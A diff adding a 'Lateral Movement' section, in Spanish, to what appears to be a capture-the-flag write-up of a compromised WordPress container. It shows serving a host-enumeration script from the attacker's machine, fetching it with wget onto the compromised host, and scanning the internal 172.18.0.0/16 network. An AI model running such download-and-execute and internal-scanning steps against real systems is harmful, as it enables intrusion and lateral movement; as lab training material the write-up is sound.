@@ -311,3 +311,30 @@ finalmente hacemos clic en `Activate Plugin`
 obtenemos conexión como el usuario `www-data` y con la pequeña enumeración principal ya podemos darnos cuenta que no estamos en la maquina host principal. estamos en otro host el cual a primera imprecisión parece ser un contenedor.
 ![[Pasted image 20240908011017.png]]
 
+## Lateral Movement
+---
+
+### 172.18.0.4 - wordpress
+
+Observamos que nos encontramos en un contenedor, para enumerar los Hosts activos dentro de la red `172.18.0.4/16`  haremos uso de :
+
+- [https://github.com/b0ySie7e/HostPortEnumerator.git](https://github.com/b0ySie7e/HostPortEnumerator.git)
+
+Para subir a la maquina comprometida haremos uso de un servidor en `python3`.
+
+```c
+❯ python3 -m http.server 80
+```
+
+Para descargar el script usaremos `wget`
+
+```c
+wget http://192.168.226.5/HostPortEnumerator.sh
+chmod +x HostPortEnumerator.sh
+```
+
+Ahora ejecutaremos el script:
+
+```c
+./HostPortEnumerator.sh -H 172.18.0.1-254
+```
